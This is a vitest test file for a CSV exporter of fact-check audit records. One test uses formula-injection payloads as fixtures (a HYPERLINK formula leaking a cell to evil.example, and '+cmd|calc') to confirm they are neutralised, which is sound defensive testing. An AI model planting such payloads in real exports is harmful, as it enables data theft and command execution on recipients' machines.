import { describe, expect, it } from 'vitest'

import { auditRecordToCsv, type AuditRecord } from '../audit-record.ts'

/**
 * The record is the artefact a customer, a platform or a regulator eventually
 * reads. Two things must hold: it has to contain the override and the person
 * who made it, and it must not become an attack on the machine that opens it.
 */

function record(overrides: Partial<AuditRecord> = {}): AuditRecord {
  return {
    post: {
      id: 'post-1',
      title: 'Vier Mittelalter-Irrtümer',
      hook: 'Vier Dinge, die fast alle falsch erzählen',
      status: 'published',
      format: 'misconception',
      account: { username: 'mittelalterfakten', igUserId: '17841400000000000' },
      caption: 'Kurz erklärt.',
      hashtags: ['wissen'],
      aiDisclosure: false,
      createdAt: '2026-07-01T10:00:00.000Z',
      approvedAt: '2026-07-02T09:30:00.000Z',
      scheduledAt: null,
      publishedAt: '2026-07-02T18:00:00.000Z',
      igMediaId: '17900000000000000',
      reviewNotes: null,
    },
    niche: {
      name: 'Wissen',
      slug: 'wissen-de',
      language: 'de',
      minConfidence: 0.75,
      requireSources: true,
      publicInterest: false,
    },
    approvedBy: { name: 'Tim', email: 't@example.org' },
    slides: [],
    claims: [
      {
        claim: 'Die Erde galt im Mittelalter als Scheibe.',
        verdict: 'false',
        confidence: 0.95,
        reasoning: 'Der Mythos stammt aus dem 19. Jahrhundert.',
        isCore: true,
        sources: [{ url: 'https://example.org/a', title: 'Inventing the Flat Earth' }],
        override: { by: { name: 'Tim', email: 't@example.org' }, note: 'Als Irrtum dargestellt.' },
      },
    ],
    consultedSources: [{ url: 'https://example.org/a', title: 'Inventing the Flat Earth' }],
    generatedAt: '2026-07-25T12:00:00.000Z',
    ...overrides,
  }
}

describe('auditRecordToCsv', () => {
  it('records the override, its author and its reason', () => {
    const csv = auditRecordToCsv(record())

    expect(csv).toContain('Tim <t@example.org>')
    expect(csv).toContain('Als Irrtum dargestellt.')
    expect(csv).toContain('false')
  })

  it('emits one row per claim plus a header', () => {
    const base = record()
    const csv = auditRecordToCsv({
      ...base,
      claims: [base.claims[0]!, { ...base.claims[0]!, claim: 'Zweite Behauptung.' }],
    })

    expect(csv.split('\r\n')).toHaveLength(3)
  })

  it('starts with a BOM so Excel reads umlauts as UTF-8', () => {
    expect(auditRecordToCsv(record()).charCodeAt(0)).toBe(0xfeff)
  })

  it('escapes embedded quotes rather than truncating the cell', () => {
    const base = record()
    const csv = auditRecordToCsv({
      ...base,
      claims: [{ ...base.claims[0]!, claim: 'Er sagte "nein" dazu.' }],
    })

    expect(csv).toContain('"Er sagte ""nein"" dazu."')
  })

  it('neutralises spreadsheet formulas in model-supplied text', () => {
    // The claim text originates from a model that read attacker-controllable
    // pages. Excel and LibreOffice execute a cell beginning with = or +, so a
    // page could otherwise plant a formula in a compliance document.
    const base = record()
    const csv = auditRecordToCsv({
      ...base,
      claims: [
        {
          ...base.claims[0]!,
          claim: '=HYPERLINK("https://evil.example/"&A1,"click")',
          reasoning: '+cmd|calc',
        },
      ],
    })

    expect(csv).toContain(`"'=HYPERLINK`)
    expect(csv).toContain(`"'+cmd|calc"`)
    // No cell may begin a formula directly after the opening quote.
    for (const cell of csv.matchAll(/"([^"]*)"/g)) {
      expect(cell[1]!.startsWith('=')).toBe(false)
      expect(cell[1]!.startsWith('+')).toBe(false)
    }
  })

  it('leaves the approver column empty when nobody has approved yet', () => {
    const csv = auditRecordToCsv(record({ approvedBy: null }))
    const [, row] = csv.split('\r\n')

    expect(row).toContain('""')
    expect(row).not.toContain('t@example.org,')
  })
})
